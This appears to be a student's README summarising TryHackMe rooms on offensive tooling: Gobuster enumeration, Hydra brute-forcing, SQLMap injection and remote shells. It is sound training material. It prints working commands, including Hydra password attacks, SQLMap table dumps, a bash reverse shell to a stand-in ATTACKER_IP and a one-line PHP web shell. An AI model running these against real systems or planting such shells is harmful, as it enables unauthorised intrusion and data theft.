# 🗺️ Offensive Security Tooling

> This section of the **Cyber-Security-101 Path** covers the core offensive tools used by penetration testers in real-world security assessments.

---

## 📁 Rooms Covered

| # | Room | Topic | Status |
|---|------|--------|--------|
| 1 | 🔍 Gobuster: The Basics | Directory & DNS Enumeration | ✅ Done |
| 2 | 💧 Hydra | Brute-Force Attacks | ✅ Done |
| 3 | 🗄️ SQLMap: The Basics | Automated SQL Injection | ✅ Done |
| 4 | 🐚 Shell Overview | Reverse, Bind & Web Shells | ✅ Done |

---

## 🧠 Why This Section Matters

> **Think of it this way:** If cybersecurity is a war, these tools are your **arsenal**. Each one has a specific mission in an offensive engagement.

```
Gobuster  →  Find the enemy's hidden locations (enumeration)
Hydra     →  Break down the door (brute-force)
SQLMap    →  Extract secrets from the database (SQL injection)
Shells    →  Plant your flag on the target machine (remote access)
```

---

## 🔍 Quick Tool Reference

### 🔎 Gobuster — Directory Enumerator
Discovers **hidden files, directories, DNS subdomains, and virtual hosts** on a target using wordlists.

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
gobuster vhost -u http://target.com -w wordlist.txt
```

**Key flags:** `-u` (URL) · `-w` (wordlist) · `-x` (file extensions) · `-t` (threads)

---

### 💧 Hydra — Brute-Force Tool
Cracks credentials across many protocols — SSH, HTTP, FTP, RDP, and more.

```bash
# SSH brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com

# HTTP POST login form
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

**Key flags:** `-l` (single username) · `-L` (username list) · `-p` (single password) · `-P` (password list)

---

### 🗄️ SQLMap — SQL Injection Automator
Automatically detects and exploits **SQL injection vulnerabilities** to extract database contents.

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# List all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
```

**Key flags:** `-u` (target URL) · `--dbs` (list databases) · `-D` (select database) · `-T` (select table) · `--dump` (extract data)

---

### 🐚 Shell Overview — Remote Access
Gain **command execution** on a target machine via reverse shells, bind shells, or web shells.

```bash
# Netcat listener (attacker machine)
nc -lvnp 4444

# Reverse shell one-liner (victim machine)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Web shell (PHP)
<?php echo shell_exec($_GET['cmd']); ?>
```

**Shell Types:**

| Type | Connection Direction | Common Use Case |
|------|----------------------|-----------------|
| Reverse Shell | Victim → Attacker | Bypassing firewalls |
| Bind Shell | Attacker → Victim | Direct inbound access |
| Web Shell | Browser → Web Server | File upload exploitation |

---

## 🔗 Room Links

- [Gobuster: The Basics](https://tryhackme.com/room/gobusterthebasics)
- [Hydra](https://tryhackme.com/room/hydra)
- [SQLMap: The Basics](https://tryhackme.com/room/sqlmapthebasics)
- [Shell Overview](https://tryhackme.com/room/shelloverview)

---

## 📊 Skills Gained

```
✅ Web enumeration & hidden directory discovery
✅ Credential brute-forcing across multiple protocols
✅ SQL injection detection & database dumping
✅ Reverse, bind, and web shell deployment
✅ Netcat listener setup & shell stabilization
```

---

*Part of [Cyber-Security-101](../README.md) path · [Back to Main Repo](../../README.md)*
